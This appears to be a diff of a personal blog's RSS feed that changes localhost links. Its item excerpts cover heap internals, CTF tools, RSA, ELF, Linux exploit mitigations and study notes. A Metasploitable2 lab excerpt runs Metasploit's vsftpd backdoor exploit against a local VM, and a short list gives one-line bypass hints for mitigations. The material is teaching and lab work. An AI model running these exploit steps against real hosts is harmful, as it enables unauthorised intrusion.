依大小分類，發生free時會放到linked list中，這個linked list稱為bin fastbin (&amp;lt;64B) smallbin (&amp;lt;512B) largebin (&amp;gt;=512B) unsortedbin (如果free的chunk大小&amp;gt;64B，先放到這裡一段時間後再加到對應的bin) 種類 Allocated Chunk prev_size: 如果前一個chunk是free的，就存前一個chunk的大小 size: 這個chunk的大小 + Status flag(最後3個bit)(因為0x10 padding，後面4bit可以不存) bit 0: PREV_INUSE: 前一個chunk是否正被使用 bit 1: IS_MMAPPED: 是否是mmap分配的 bit 2: NON_MAIN_ARENA: 是否不是main arena User Data Free Chunk prev_size size fd: 指標指向下一個chunk bk: 指標指向上一個chunk fd_nextsize: 下一個largebin的指標 bk_nextsize: 上一個largebin的指標 Data Top Chunk prev_size size: 還剩多少空間 1 2 3 4 5 6 7 8 9 10 struct malloc_chunk { INTERNAL_SIZE_T mchunk_prev_size; /* Size of previous chunk (if free).</description>
     </item>
     <item>
       <title>【CTF】CTF工具集</title>
-      <link>//localhost:1313/posts/2023/ctf_tools/</link>
+      <link>http://localhost:1313/posts/2023/ctf_tools/</link>
       <pubDate>Sun, 12 Nov 2023 00:00:00 +0800</pubDate>
-      <guid>//localhost:1313/posts/2023/ctf_tools/</guid>
+      <guid>http://localhost:1313/posts/2023/ctf_tools/</guid>
       <description>CTF工具集 基本工具 Python 2+3 &amp;amp; pip Editor: vim, vscode, notepad Git Kali Linux 掃描工具 工具名稱 種類 說明 nmap web 弱點掃描 dirsearch web 網站目錄掃描 nikto web Web server漏洞掃描 dirb web 網站目錄掃描 sqlmap web SQL Injection 測試 wpscan web WordPress漏洞掃描 CyberChef web 線上多功能解 Code 工具 Burp Suite web Web 測試工具 WireShark web 封包分析 Ghidra reverse 逆向工具 IDA Pro reverse 逆向工具 crypto stego misc forensics android windows </description>
     </item>
     <item>
       <title>【CTF】Nmap</title>
-      <link>//localhost:1313/posts/2023/nmap/</link>
+      <link>http://localhost:1313/posts/2023/nmap/</link>
       <pubDate>Sun, 12 Nov 2023 00:00:00 +0800</pubDate>
-      <guid>//localhost:1313/posts/2023/nmap/</guid>
+      <guid>http://localhost:1313/posts/2023/nmap/</guid>
       <description>Nmap Nmap Download&#xA;Debian安裝&#xA;1 sudo apt install nmap 使用&#xA;1 nmap -sC -sV &amp;lt;ip/hostname&amp;gt; -sC: 使用預設的Nmap腳本(&amp;ndash;script=default) -sV: 啟用版本偵測(-A) -T4: 設定掃描速度為4(1-5)，預設為3 -sS: 送TCP SYN封包來掃描 -sT: 掃描時使用系統呼叫API送封包(猜作業系統版本，需要root) -p: 指定port -Pn: 跳過Ping掃描，全當存活服務(避免防火牆拒絕) -4: 強制使用IPv4 -6: 強制使用IPv6 </description>
     </item>
     <item>
       <title>【CTF】密碼學-RSA加密演算法</title>
-      <link>//localhost:1313/posts/2023/rsa/</link>
+      <link>http://localhost:1313/posts/2023/rsa/</link>
       <pubDate>Fri, 03 Nov 2023 00:00:00 +0800</pubDate>
-      <guid>//localhost:1313/posts/2023/rsa/</guid>
+      <guid>http://localhost:1313/posts/2023/rsa/</guid>
       <description>RSA加密演算法 簡介 由三位數學家Rivest、Shamir、Adleman所提出，RSA就是他們的姓氏第一個字母組成的。 非對稱加密演算法(公鑰加密演算法)。 一般有1024、2048、4096位的金鑰長度，位是二進位位元數 生成金鑰過程 選兩個質數$p$、$q$，$p\neq q$。 算 $\phi(pq) $，其中 $\phi(n)$ 為歐拉函數，表示小於 $n$ 且與 $n$ 互質的正整數個數，歐拉定理 $\phi(pq) = (p-1)(q-1)$。 選一個數 $e$，使 $1 \leq e \leq \phi(pq)$ 且 $e$ 與 $\phi(pq)$ 互質。 找一個數 $d$，使 $ed \equiv 1 \pmod{\phi(pq)}$，即 $ed$ 除以 $phi(pq)$ 的餘數 $ = 1$。 4-1. 這步就是在求 $e$ 關於 $\phi(pq)$ 的模逆元，可以用擴展歐幾里得法求，參考：算法筆記-數論 $p$、$q$、$e$ 組成公鑰 $(n,e)$，$p$、$q$、$d$ 組成私鑰 $(n,d)$。 加密過程 將明文字串 $m$ 轉換成數字(ASCII)陣列。 一個數一個數加密，設數字為 $x$，計算 $x^e\ mod\ n$，得到密文。 把這些密文再組合起來 解密過程 把密文拆開，一個數一個數解密，設數字為 $y$，計算 $y^d\ mod\ n$，得到明文。 把這些明文再組合起來 攻擊 gmpy2 線上分解n RSACTFTool</description>
     </item>
     <item>
       <title>【系統安全】ELF檔案格式</title>
-      <link>//localhost:1313/posts/2023/elf/</link>
+      <link>http://localhost:1313/posts/2023/elf/</link>
       <pubDate>Wed, 25 Oct 2023 00:00:00 +0800</pubDate>
-      <guid>//localhost:1313/posts/2023/elf/</guid>
+      <guid>http://localhost:1313/posts/2023/elf/</guid>
       <description>ELF檔案格式 ELF(Executable and Linkable Format) 可執行可連結格式 定義：/usr/include/elf.h 類型 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 &amp;gt; gcc a.c -o a.o &amp;gt; gcc b.c -static -o b.o &amp;gt; gcc c.c -c -o c.o &amp;gt; gcc d.c -fPIC d.c -o d.o &amp;amp;&amp;amp; gcc d.o -shared -o d.so ##### &amp;gt; file a.o a.o: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), dynamically linked, not stripped &amp;gt; file b.</description>
     </item>
     <item>
       <title>【系統安全】Linux 安全機制</title>
-      <link>//localhost:1313/posts/2023/linux_system_security/</link>
+      <link>http://localhost:1313/posts/2023/linux_system_security/</link>
       <pubDate>Sun, 22 Oct 2023 00:00:00 +0800</pubDate>
-      <guid>//localhost:1313/posts/2023/linux_system_security/</guid>
+      <guid>http://localhost:1313/posts/2023/linux_system_security/</guid>
       <description>Address space layout randomization(ASLR): 記憶體隨機載入，會把.stack section, .so section, mmap()隨機化，可以防止攻擊者跳到指定記憶體任意利用&#xA;繞過：目前沒有很好的繞過方法，只能靠運氣猜記憶體在哪&#xA;Stack Canary: 金絲雀，在以前礦工在挖礦的時候會帶一隻金絲雀下去，如果金絲雀暈倒表示可能挖到有毒氣體了，要趕快跑，在程式裡面也會有這樣的機制，每次執行一個函數會先養一隻金絲雀(一個隨機數)，如果攻擊者傷害到那隻金絲雀(覆寫掉隨機數)就表示受到攻擊，程式在函式離開前檢查到就會直接停止&#xA;繞過：只要不碰到金絲雀，或推算出金絲雀長什麼樣子就能繞過&#xA;No-eXecute(NX): 堆疊不可執行，把記憶體的stack標記為不可執行，可以防止攻擊者跳到堆疊任意寫程式&#xA;繞過：不要跳到stack，那跳到text就好了&#xA;PIE(Position Independent Executable): 記憶體隨機化，跟ASLR很像，但是是在編譯器上做好，會把.text section, .data section, .bss section隨機化&#xA;繞過：讓程式執行的過程中洩露記憶體然後就能推算&#xA;程式實際位址 = 程式加載位址 + 偏移位址&#xA;Fortify Source: 在編譯時檢查是否存在buffer overflow，並將危險函式替換成安全函式，例如strcpy()會被替換成strncpy()&#xA;RELRO(RELocation Read-Only): 在Lazy Binding時，會將.got.plt section設為read-only，可以防止攻擊者修改.got.plt section</description>
     </item>
     <item>
       <title>【系統安全】組合語言</title>
-      <link>//localhost:1313/posts/2023/asm/</link>
+      <link>http://localhost:1313/posts/2023/asm/</link>
       <pubDate>Sun, 22 Oct 2023 00:00:00 +0800</pubDate>
-      <guid>//localhost:1313/posts/2023/asm/</guid>
+      <guid>http://localhost:1313/posts/2023/asm/</guid>
       <description>組合語言 編譯流程 詞法分析 (Lexical Analysis) 切token -&amp;gt; 詞素 (Lexeme)&#xA;語法分析 (Syntax Analysis) 建立語法樹 (Syntax Tree)&#xA;語意分析 (Semantic Analysis) 用語法樹跟符號表 (Symbol Table) 來檢查語意&#xA;中間碼產生 (Intermediate Code Generation)&#xA;最佳化 (Optimization)&#xA;目標碼產生 (Code Generation)&#xA;GCC編譯流程 前置處理 (Preprocessing) -&amp;gt; 編譯 (Compilation) -&amp;gt; 組譯 (Assembly) -&amp;gt; 連結 (Linking) 檔案副檔名 (.i) (.s) (.o) (.out) 指令參數 -E -S -c 前置處理 (Preprocessing) 遞迴處理所有 #include 遞迴展開所有 #define 刪除所有註解 處理所有 #if #ifdef #ifndef #else #endif 行號記錄 編譯 (Compilation) 組語格式：預設 AT&amp;amp;T 語法，可用 -masm=intel 改成 Intel 語法</description>
     </item>
     <item>
       <title>【CTF-WriteUp】PicoCTF-Here&#39;s a LIBC</title>
-      <link>//localhost:1313/posts/2023/ctf_picoctf_heresalibc/</link>
+      <link>http://localhost:1313/posts/2023/ctf_picoctf_heresalibc/</link>
       <pubDate>Fri, 20 Oct 2023 00:00:00 +0800</pubDate>
-      <guid>//localhost:1313/posts/2023/ctf_picoctf_heresalibc/</guid>
+      <guid>http://localhost:1313/posts/2023/ctf_picoctf_heresalibc/</guid>
       <description>題目：&#xA;給你指定的libc與elf file請pwn掉它&#xD;概念： 組合語言課學的各種東西 逆向工程 Little endian stack frame ELF format ret2libc 題解： 執行 file 查看檔案屬性 這是一個64位ELF格式可執行檔&#xA;執行 checksec 查看安全屬性 只開了 NX(No-Execute, 堆疊不可執行)&#xA;拿去Ghidra或IDA逆向 看起來會用到的函式：&#xA;1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 char convert_case(char c, int f){ char ret; if( c &amp;lt; &amp;#39;a&amp;#39; || c &amp;gt; &amp;#39;z&amp;#39; ){ if( c &amp;lt; &amp;#39;A&amp;#39; || c &amp;gt; &amp;#39;Z&amp;#39; ) ret = a; else if(f % 2 == 0) ret = a; else ret = a + 32; } else if( f % 2 == 0 ) ret = a - 32; else ret = a; return ret; } void do_stuff(){ char garbage; char str[112]; scanf(&amp;#34;%[^\n]&amp;#34;, str); scanf(&amp;#34;%c&amp;#34;, &amp;amp;garbage); for(int i = 0; i &amp;lt; 100 ; i++){ str[i] = convert_case(str[i], i); } puts(str); } void main(){ .</description>
     </item>
     <item>
       <title>【CPE】2023-05-23 紀錄</title>
-      <link>//localhost:1313/posts/2023/cpe_20230523/</link>
+      <link>http://localhost:1313/posts/2023/cpe_20230523/</link>
       <pubDate>Thu, 25 May 2023 00:00:00 +0800</pubDate>
-      <guid>//localhost:1313/posts/2023/cpe_20230523/</guid>
+      <guid>http://localhost:1313/posts/2023/cpe_20230523/</guid>
       <description>CPE(大學程式能力檢定) 第一次考CPE，考前沒時間準備所以基本上就是裸考。&#xA;隨便寫寫，做了4題&#xA;pA - UVA11934 題意： 給你一個二次函數、一個除數 $d$ 及 $L$，求 $f(0)$ 到 $f(L)$ 的值有幾個可被 $d$ 整除&#xA;$-1000 \le a,b,c \le 1000, 1&amp;lt;d&amp;lt;10^6, 0 \le L &amp;lt; 1000$&#xA;1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 #include &amp;lt;bits/stdc++.h&amp;gt; using namespace std; #define int long long #define endl &amp;#39;\n&amp;#39; int f(int a, int b, int c, int x) { return a * x * x + b * x + c; } signed main() { int a, b, c, d, L; while (cin &amp;gt;&amp;gt; a &amp;gt;&amp;gt; b &amp;gt;&amp;gt; c &amp;gt;&amp;gt; d &amp;gt;&amp;gt; L) { if (a == 0 &amp;amp;&amp;amp; b == 0 &amp;amp;&amp;amp; c == 0 &amp;amp;&amp;amp; d == 0 &amp;amp;&amp;amp; L == 0) break; int ans = 0; for (int i = 0; i &amp;lt;= L; i++) { if (f(a, b, c, i) % d == 0) ans++; } cout &amp;lt;&amp;lt; ans &amp;lt;&amp;lt; endl; } } pB - UVA11349 題意： 給一個方矩陣問是否為對稱矩陣。</description>
     </item>
     <item>
       <title>中原111資工計概下學期期中機測</title>
-      <link>//localhost:1313/posts/2023/cycu_cal_1112_midterm/</link>
+      <link>http://localhost:1313/posts/2023/cycu_cal_1112_midterm/</link>
       <pubDate>Wed, 12 Apr 2023 00:00:00 +0800</pubDate>
-      <guid>//localhost:1313/posts/2023/cycu_cal_1112_midterm/</guid>
+      <guid>http://localhost:1313/posts/2023/cycu_cal_1112_midterm/</guid>
       <description>Pre 題目提供以下資料結構與函式&#xA;1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 #include &amp;lt;ctype.</description>
     </item>
     <item>
       <title>中原111資工計概上學期期末機測</title>
-      <link>//localhost:1313/posts/2023/cycu_cal_111_finalexam/</link>
+      <link>http://localhost:1313/posts/2023/cycu_cal_111_finalexam/</link>
       <pubDate>Mon, 09 Jan 2023 00:00:00 +0800</pubDate>
-      <guid>//localhost:1313/posts/2023/cycu_cal_111_finalexam/</guid>
+      <guid>http://localhost:1313/posts/2023/cycu_cal_111_finalexam/</guid>
       <description>答案僅供參考 答案僅供參考 答案僅供參考 我看起來像標準答案嗎 Pre 題目提供以下資料結構與函式&#xA;1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 # include &amp;lt;stdlib.</description>
     </item>
     <item>
       <title>【普物】 Schrodinger Equation Derivation</title>
-      <link>//localhost:1313/posts/2023/schrodinger_equation_derivation/</link>
+      <link>http://localhost:1313/posts/2023/schrodinger_equation_derivation/</link>
       <pubDate>Tue, 03 Jan 2023 00:00:00 +0800</pubDate>
-      <guid>//localhost:1313/posts/2023/schrodinger_equation_derivation/</guid>
+      <guid>http://localhost:1313/posts/2023/schrodinger_equation_derivation/</guid>
       <description>薛丁格方程 試著找到一方程式描述能量與波函數的關係。&#xA;波函數 已知波函數應形如 $$ \psi(x,t) = A e^{i(kx-\omega t)} $$ 的形式&#xA;若波函數對時間微分，則有 $$ \frac{\partial \psi}{\partial t} = -i \omega A e^{i(kx-\omega t)} = -i \omega \psi $$&#xA;若波函數對位置微分，則有 $$ \frac{\partial \psi}{\partial x} = i k A e^{i(kx-\omega t)} = i k \psi $$&#xA;對位置的二次微分，則有 $$ \frac{\partial^2 \psi}{\partial x^2} = -k^2 A e^{i(kx-\omega t)} = -k^2 \psi $$&#xA;寫成三維空間形式為 $$ \nabla^2 \psi = -k^2 A e^{i(kx-\omega t)} = -k^2 \psi $$</description>
     </item>
     <item>
       <title>SQL 基本語法(sqlite3 in python)</title>
-      <link>//localhost:1313/posts/2022/sql_basic/</link>
+      <link>http://localhost:1313/posts/2022/sql_basic/</link>
       <pubDate>Sun, 18 Dec 2022 00:00:00 +0800</pubDate>
-      <guid>//localhost:1313/posts/2022/sql_basic/</guid>
+      <guid>http://localhost:1313/posts/2022/sql_basic/</guid>
       <description>環境 市面上有很多家 SQL，在效能、安全性、功能、語法上有些微差異，常見的有：&#xA;SQLite MySQL PostgreSQL SQL Server 在這裡使用 SQLite 來說明，在 Python 中可以直接使用 SQLite3 來操作。&#xA;安裝套件 1 pip install sqlite3 與資料庫連線 1 2 import sqlite3 conn = sqlite3.connect(&amp;#39;example.db&amp;#39;) 當此程式執行時，如果與程式同一個資料夾下有 example.db 檔案，則會連線到該檔案，如果沒有，則會建立一個新的 example.db 檔案。&#xA;並且 conn 將被建立為 Connection 物件表示資料庫。&#xA;建立表格 在建立表格前，需要一個 Cursor 來執行 SQL 各種指令。&#xA;1 cur = conn.cursor() 建立表格的語法如下：&#xA;1 2 3 4 5 6 CREATE TABLE 表格名稱 ( 第一欄名稱 資料類型, 第二欄名稱 資料類型, 第三欄名稱 資料類型, .... ); 在 SQLite 中，資料類型有以下幾種：</description>
     </item>
     <item>
       <title>【資訊安全】Metasploitable3 環境建置(Windows VMware)</title>
-      <link>//localhost:1313/posts/2022/metasploitable3_installation/</link>
+      <link>http://localhost:1313/posts/2022/metasploitable3_installation/</link>
       <pubDate>Tue, 29 Nov 2022 00:00:00 +0800</pubDate>
-      <guid>//localhost:1313/posts/2022/metasploitable3_installation/</guid>
+      <guid>http://localhost:1313/posts/2022/metasploitable3_installation/</guid>
       <description>需求 Windows 10 up VMware Workstation Pro 良好的網路環境 1. 下載並安裝 Vagrant &amp;amp; Vagrant VMware Utility Vagrant 是建置虛擬機的工具，透過 Vagrantfile 來設定虛擬機。&#xA;Download Vagrant&#xA;Download Vagrant VMware Utility&#xA;2. 快速建置 打開 PowerShell，cd 到適當的資料夾，依序輸入&#xA;1 2 3 4 mkdir metasploitable3-workspace cd metasploitable3-workspace Invoke-WebRequest -Uri &amp;#34;https://raw.githubusercontent.com/rapid7/metasploitable3/master/Vagrantfile&amp;#34; -OutFile &amp;#34;Vagrantfile&amp;#34; vagrant up --provider=vmware_desktop 等待一段時間，完成後可以在&#xA;C:\Users\{username}\.vagrant.d\boxes\xxx\yyy\vmware_desktop\ 下看到 box 檔案。&#xA;將 vmware_desktop 資料夾複製到適當的地方，接著打開 VMWare，在 Library 下按右鍵點選 Scan for Virtual Machines，選擇剛剛複製的資料夾，就可以使用 Metasploitable3 了。</description>
     </item>
     <item>
       <title>【資訊安全】Metasploitable2 滲透測試實作(筆記)</title>
-      <link>//localhost:1313/posts/2022/metasploitable2_vsftpd/</link>
+      <link>http://localhost:1313/posts/2022/metasploitable2_vsftpd/</link>
       <pubDate>Wed, 23 Nov 2022 00:00:00 +0800</pubDate>
-      <guid>//localhost:1313/posts/2022/metasploitable2_vsftpd/</guid>
+      <guid>http://localhost:1313/posts/2022/metasploitable2_vsftpd/</guid>
       <description>先備知識 知道如何使用 VMware 或 VirtualBox Kali Linux 基本操作 能夠讓 Kali 連線至 Metasploitable2 Metasploitable2 一種充滿漏洞的Linux系統，適合用於練習滲透測試。&#xA;可直接到 Sourceforge 上下載虛擬機檔。&#xA;偵查 開啟 Metasploitable2，會先要求輸入帳號密碼，帳密都是 msfadmin (輸入密碼時不會顯示在螢幕上)。&#xA;輸入 ifconfig 查看 IP 位址，假設為 192.168.235.130。&#xA;打開 Kali Linux (IP為192.168.235.128)，終端輸入 msfconsole 進入 Metasploit。&#xA;使用 nmap 掃描可以連的 port 1 msf6 &amp;gt; nmap -sV 192.168.235.130 可以看到有一大堆 port 是開著的&#xA;滲透 看看 vsftpd 有沒有洞，在 msf 中輸入 search vsftpd，可以看到有一個 exploit 可以使用 使用這個 exploit，用 show options 可以看到這個 exploit 需要的參數，然後用 set 參數 值 設定一些參數。 1 2 3 msf6 &amp;gt; use exploit/unix/ftp/vsftpd_234_backdoor msf6 exploit(unix/ftp/vsftpd_234_backdoor) &amp;gt; show options msf6 exploit(unix/ftp/vsftpd_234_backdoor) &amp;gt; set RHOSTS 192.</description>
     </item>
     <item>
       <title>中原111資工計概上學期期中機測</title>
-      <link>//localhost:1313/posts/2022/cycu_cal111_midterm/</link>
+      <link>http://localhost:1313/posts/2022/cycu_cal111_midterm/</link>
       <pubDate>Mon, 07 Nov 2022 00:00:00 +0800</pubDate>
-      <guid>//localhost:1313/posts/2022/cycu_cal111_midterm/</guid>
+      <guid>http://localhost:1313/posts/2022/cycu_cal111_midterm/</guid>
       <description>(本人已放棄思考) 答案僅供參考 答案僅供參考 答案僅供參考 鬼才知道是不是正解 pA 實作NotLetter(char ch) function，如果ch不是字母就回傳true，反則false。&#xA;1 2 3 4 5 6 7 bool NotLetter(char ch){ if(ch &amp;gt;= &amp;#39;a&amp;#39; &amp;amp;&amp;amp; ch &amp;lt;= &amp;#39;z&amp;#39;) return false; if(ch &amp;gt;= &amp;#39;A&amp;#39; &amp;amp;&amp;amp; ch &amp;lt;= &amp;#39;Z&amp;#39;) return false; return true; } 補：事實上在 ctype.h已經有 isalpha() 可使用，但這裡不允許include其他東西。&#xA;pB 實作MonotonicIncreasing() function，讀入若干個整數，直到-99999，如果數組(不含-99999)非單調遞增則回傳false，否則或如果只有一個數則回傳true。&#xA;1 2 3 4 5 6 7 8 9 10 11 12 bool MonotonicIncreasing(){ int n; scanf(&amp;#34;%d&amp;#34;, &amp;amp;n); while(n!=-99999){ int m; scanf(&amp;#34;%d&amp;#34;, &amp;amp;m); if(m &amp;lt; n &amp;amp;&amp;amp; m !</description>
     </item>
     <item>
       <title>【Git】Git分支的打開方式</title>
-      <link>//localhost:1313/posts/2022/git_branch/</link>
+      <link>http://localhost:1313/posts/2022/git_branch/</link>
       <pubDate>Thu, 27 Oct 2022 00:00:00 +0800</pubDate>
-      <guid>//localhost:1313/posts/2022/git_branch/</guid>
+      <guid>http://localhost:1313/posts/2022/git_branch/</guid>
       <description>當一個專案有許多人一起開發時，不能隨便commit，因此當需要增加功能、修正bug時可以開一個分支來進行，確認沒問題後再合併，就不會影響主要的生產線。&#xA;初始化Local Repo 詳見 上一篇文章&#xA;查看現在有哪些分支 1 $ git branch Output:&#xA;1 * master 新增分支 1 $ git branch main 這樣就會新增一個名為main的分支，但是還沒有切換到該分支，所以還是在master分支上。&#xA;重新命名分支 1 $ git branch -M cool # 將目前分支重新命名為cool 或者&#xA;1 $ git branch -m main cool # 將main分支重新命名為cool分支 刪除分支 1 $ git branch -d main # 刪除main分支 這時候可能會看到 error: The branch &#39;main&#39; is not fully merged，因為main還沒被合併，不給刪除&#xA;可以使用 -D 強制刪除&#xA;1 $ git branch -D main 切換分支 1 $ git checkout main 如果分支不存在，可以使用 -b 來建立並切換到該分支</description>
     </item>
     <item>
       <title>【Git】Git初始設定與環境</title>
-      <link>//localhost:1313/posts/2022/git_initial/</link>
+      <link>http://localhost:1313/posts/2022/git_initial/</link>
       <pubDate>Thu, 27 Oct 2022 00:00:00 +0800</pubDate>
-      <guid>//localhost:1313/posts/2022/git_initial/</guid>
+      <guid>http://localhost:1313/posts/2022/git_initial/</guid>
       <description>What is Git? 能夠紀錄更新歷史紀錄，進行復原(Rollback)、比較、合併(Merge)等等的分散式版本控制系統。 讓開發者(群)能夠更好管理專案。&#xA;分散式與中央式版控系統 中央式版控系統 需要一台伺服器，所有版本控制功能必須在這台伺服器上運作，如果伺服器壞了或沒網路就無法使用&#xA;分散式版控系統 即使沒有網路也能使用，可以先在本機版控直到能連上伺服器後再同步。&#xA;Git環境 Local Repo 我們在修改完檔案後，透過git add 將檔案加入暫存區，再透過git commit將檔案加入Local Repo。&#xA;Remote Repo Remote Repo是一個遠端的Git伺服器，我們可以將Local Repo push 到 Remote Repo，也可以從Remote Repo pull 到 Local Repo。&#xA;Git安裝 Windows 到以下網址下載合適的版本並進行安裝&#xA;Git for Windows&#xA;安裝過程直接按到底即可，接著打開Git Bash，可從開始功能表或是桌面右鍵選擇Git Bash Here。&#xA;這套軟體能模擬Linux的環境，所以我們可以在這裡使用Linux的指令。&#xA;Linux 非常簡單，打開你的終端機&#xA;1 2 $ sudo apt update $ sudo apt install git -y 初始設定 1 2 3 4 5 $ git config --global user.name &amp;#34;你的名字&amp;#34; $ git config --global user.</description>
     </item>
     <item>
       <title>【Discord 聊天機器人】 - Discord interactions.py 介紹與開始</title>
-      <link>//localhost:1313/posts/2022/discordpy2_and_interactions/</link>
+      <link>http://localhost:1313/posts/2022/discordpy2_and_interactions/</link>
       <pubDate>Wed, 19 Oct 2022 00:00:00 +0800</pubDate>
-      <guid>//localhost:1313/posts/2022/discordpy2_and_interactions/</guid>
+      <guid>http://localhost:1313/posts/2022/discordpy2_and_interactions/</guid>
       <description>Why discord-py-interactions(以下簡稱 dcpi)? 支援更多操作如斜線指令、按鈕、選單，且簡單易懂&#xA;簡介 經過大量搜尋資料，發現dcpi的介紹特別少， 因此閱讀完官方API後想記錄下來翻成中文並做個整理。&#xA;先備知識 需知道如何在 Discord Developers Applications 裡創建機器人 需知道命令列的基本操作 環境建置 既然是py當然要安裝Python(目前已測試3.8~3.10可用)&#xA;Python官網&#xA;安裝 dcpi(以編寫此篇文時的版本為主)&#xA;dcpi Pypi&#xA;1 $ pip3 install discord-py-interactions==4.3.4 Quick Start 根據這份API文件&#xA;先創建一個專門放Discord Bot的資料夾，然後在裡面新增一個檔案名為bot.py， 並在DC的開發應用頁面創建好機器人&#xA;然後複製以下code，將your-bot-token換成機器人的token，注意不要將token公開給別人。&#xA;1 2 3 4 5 6 7 8 9 # 導入interactions套件，如果報錯的話檢查一下環境建置是否有問題 import interactions # 宣告bot這個變數為一個客戶端，記得將your-bot-token改成Discord bot的token # 我們需要告訴Discord我們要監聽哪些事件，透過設定intents達成 bot = interactions.Client(token=&amp;#34;your-bot-token&amp;#34;,intents=interactions.flags.Intents.ALL) # 啟動機器人 bot.start() 接著執行它&#xA;1 $ python3 bot.py 這樣機器人就成功上線了&#xA;第一個斜線指令 修改程式碼&#xA;1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 import interactions bot = interactions.</description>
     </item>
     <item>
       <title>【CTF-WriteUp】PicoCTF-file-run2</title>
-      <link>//localhost:1313/posts/2022/ctf_picoctf_file_run2/</link>
+      <link>http://localhost:1313/posts/2022/ctf_picoctf_file_run2/</link>
       <pubDate>Tue, 04 Oct 2022 00:00:00 +0800</pubDate>
-      <guid>//localhost:1313/posts/2022/ctf_picoctf_file_run2/</guid>
+      <guid>http://localhost:1313/posts/2022/ctf_picoctf_file_run2/</guid>
       <description>題目：&#xA;給你一個檔案，執行它時輸入&amp;quot;Hello!&amp;quot;(不含引號)。&#xD;概念： 逆向工程 Linux 指令操作 Linux 權限控制 題解 丟進IDA看看，發現確實只要輸入Hello!就能跑出Flag，&#xA;1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 main(int param_1,long param_2){ int var1; if ((param_1 &amp;lt; 2) || (2 &amp;lt; param_1)) { puts(&amp;#34;Run this file with only one argument.&amp;#34;); } else { var1 = strcmp(*(char **)(param_2 + 8),&amp;#34;Hello!&amp;#34;); if (var1 == 0) { printf(&amp;#34;The flag is: %s&amp;#34;,flag); } else { puts(&amp;#34;Won\&amp;#39;t you say \&amp;#39;Hello!</description>
     </item>
     <item>
       <title>gdb 除錯工具學習</title>
-      <link>//localhost:1313/posts/2022/gdb/</link>
+      <link>http://localhost:1313/posts/2022/gdb/</link>
       <pubDate>Mon, 26 Sep 2022 00:00:00 +0800</pubDate>
-      <guid>//localhost:1313/posts/2022/gdb/</guid>
+      <guid>http://localhost:1313/posts/2022/gdb/</guid>
       <description>What is GDB? gdb全名為gnu debugger，是一種動態Debug的工具。&#xA;使用 我們可以先寫一個簡易的Hello World，並宣告一些變數&#xA;1 2 3 4 5 6 7 8 # include&amp;lt;stdio.h&amp;gt; int main(){ int a = 5; int b = a * 6; int c = b + 4; printf(&amp;#34;Hello World\n&amp;#34;); return 0; } 記得在編譯時加上參數 -g，否則gdb將提示找不到除錯符，加了只差在程式大小會變大。&#xA;1 2 $ gcc -g hello.c -o hello $ gdb ./hello 指令 指令 簡寫 簡述 help h 查看指令說明 list l 印出程式碼 file 開啟檔案 run r 執行程式 kill 停止程式 breakpoint b, bre, break 設定斷點 ex: b 15表示執行到第15行 continue c, cont 繼續執行 next n 步過(遇到呼叫函式會將該函式當成一條指令執行) step s 步入(遇到呼叫函式會進入函式一步一步執行) print p 印出變數的值 ex: p num display 每次步過/入後印出變數值 ex: display num info 查看特定資訊 ex: info break查看設了哪些斷點，不輸入參數可查詢指令 quit q 離開gdb，或按Ctrl+C &amp;lt;Click&amp;gt; Enter 執行上一條指令 </description>
     </item>
     <item>
       <title>Vim 極簡教學</title>
-      <link>//localhost:1313/posts/2022/vim_simple_tutorial/</link>
+      <link>http://localhost:1313/posts/2022/vim_simple_tutorial/</link>
       <pubDate>Tue, 13 Sep 2022 00:00:00 +0800</pubDate>
-      <guid>//localhost:1313/posts/2022/vim_simple_tutorial/</guid>
+      <guid>http://localhost:1313/posts/2022/vim_simple_tutorial/</guid>
       <description>簡介 Vim是一種開源的編輯器，是Vi的進化版，由於操作方便，有許多人很愛用，是作為Linux OS主要的編輯器之一。&#xA;起步 若要使用vim編輯檔案，請在命令列中輸入 vim xxx.yyy，如果xxx.yyy存在就會直接進入普通模式並可瀏覽檔案；&#xA;如果不存在，就會在儲存後新建一個。&#xA;模式 Vim主要有四種模式： 普通模式、編輯模式、視覺模式、指令模式&#xA;普通模式 初始畫面，可使用方向鍵控制游標，或用Page UP/Down換頁，而任何有關編輯的指令都要在此模式下進行&#xA;以下是常用的編輯指令&#xA;dd - 刪除整行 (n)dd - 刪除從游標往下數n行 yy - 複製整行 (n)yy - 複製從游標往下數n行 u - 復原(undo)動作 Ctrl+r - 重做(redo)動作 . - 重複上一個動作 x - 刪除字元 X - 刪除前一個字元(Backspace) &amp;gt;&amp;gt; - 縮排 &amp;lt;&amp;lt; - 反向縮排 編輯模式 在普通模式按下 i(Insert), o(Open), a(Append) 等鍵就會進入編輯模式，此時可以看到視窗最下方出現 -- INSERT --，即可對檔案編輯&#xA;按下 Esc 即可回到普通模式，此時 -- INSERT -- 會消失&#xA;視覺(選取)模式 在普通模式按下 v 即可進入視覺模式，此時可以看到視窗最下方出現 -- VISUAL --，可以使用方向鍵選取文字，並使用 w 選取下一個單字的開頭或 $ 選取後面整行。</description>
     </item>
     <item>
       <title>VSCode設定C&#43;&#43;教學(Code Runner)</title>
-      <link>//localhost:1313/posts/2022/vscode_cpp_setup/</link>
